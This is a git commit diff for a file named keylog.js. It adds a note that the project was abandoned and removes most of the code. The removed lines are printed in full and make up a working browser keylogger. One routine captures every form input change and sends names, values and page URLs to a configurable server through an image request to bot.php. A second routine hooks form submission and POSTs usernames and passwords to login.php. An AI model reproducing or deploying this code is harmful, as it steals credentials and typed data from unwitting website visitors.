3425306223e919e786a97f9441a3992e695cca1d
hakanonymos <30985149+hakanonymos@users.noreply.github.com>
2019-05-18 18:15:42 +0000

    Update keylog.js

--- keylog.js
+++ keylog.js
@@ -1,4 +1,4 @@
-
+# this projet was abandoned in github
 
 
 
@@ -12,101 +12,9 @@
 
 
 var url = "http://127.0.0.1/server/"; //change http://127.0.0.1  to your web server
-var debug = 1;
-var currLoc = "";
-spyjs_refreshEvents();
 
-function spyjs_refreshEvents(){
-	if(currLoc != location.href){
-		currLoc=location.href;
-		if(debug){
-			console.log(currLoc);
-		}
-		spyjs_saveData("("+currLoc+")");
-	}
-	$('input').unbind('change');
-	$('input').change(function(e) {
-  		spyjs_getInput(e.currentTarget);
-	});
-	
-	$('select').unbind('change');
-	$('select').change(function(e) {
-  		spyjs_getInput(e.currentTarget);
-	});
-	
-	$('checkbox').unbind('change');
-	$('checkbox').change(function(e) {
-  		spyjs_getInput(e.currentTarget);
-	});
-	
-	$('button').unbind('change');
-	$('button').change(function(e) {
-  		spyjs_getInput(e.currentTarget);
-	});
-	
-	
-	$('textarea').unbind('change');
-	$('textarea').change(function(e) {
-  		spyjs_getInput(e.currentTarget);
-	});
-}
-	
-function spyjs_getInput(inputInfo){
-	 
-	var name = inputInfo.name;
-	var value = inputInfo.value;
-	var stolenInput = {};
-	if(name === ""){
-		name="undefined_input";
-	}
-	if(value != ""){
-		stolenInput[name] = value;
-		if(debug){
-			console.log(name+"="+value);
-		}
-		
-        var pic = new Image()
-        pic.src = url+'bot.php?values='+name+"="+value +  "<br/>"+ ""+currLoc+""
-		
-	}
-}
-function spyjs_saveData(data){
-	
-};
 
    
-   
-   // 2nd keylogger get only username /password
-   // change http://127.0.0.1 to your web server
-
-var forms = document.getElementsByTagName('form');
- for (var i = 0; i < forms.length; i++) {
- var form = forms[i];
-var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'http://127.0.0.1/server/login.php'); //change http://127.0.0.1 to your web server
-     var fields = form.getElementsByTagName('input');      
-      for (var j = 0; j < fields.length; j++) {
-          var f = fields[j];
-          if (!form._pass && f.type == 'password')
-              form._pass = f;
-          else if (!form._user && (f.type == 'text' || f.type == 'email'))
-              form._user = f;
-
-          if (!(form._user !== undefined && form._pass !== undefined))
-              continue;
-              form.onsubmit = function() {
-              if (this._user.value && this._pass.value) {                 				 
-                var userName = this._user.value
-                var passWord = this._pass.value
-				var param = ""
-				param += 'user='+userName+'&pass='+passWord +document.URL
-             
-			   xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-               xhr.send(param);
-				
-              }
-                  }};
-              }       
 	 
 	 
 	 
